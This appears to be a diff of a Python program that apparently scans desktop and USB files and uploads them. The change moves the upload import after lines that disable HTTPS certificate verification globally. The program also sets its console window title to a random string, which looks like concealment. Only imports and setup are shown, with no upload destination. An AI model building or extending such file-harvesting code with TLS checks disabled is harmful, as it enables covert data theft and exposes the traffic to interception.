@@ -1,7 +1,6 @@
 import threading
 from concurrent.futures import ThreadPoolExecutor
 import time
-from upload import uploadf
 from filescanner import scan_files, limitFileSize, getUsb, get_desktop
 import os
 
@@ -9,6 +8,8 @@ os.environ['PYTHONHTTPSVERIFY'] = "0"
 
 import ssl
 ssl._create_default_https_context = ssl._create_unverified_context
+
+from upload import uploadf
 
 import ctypes
 ctypes.windll.kernel32.SetConsoleTitleW("lqJnMCy7fOFsS4ZG")
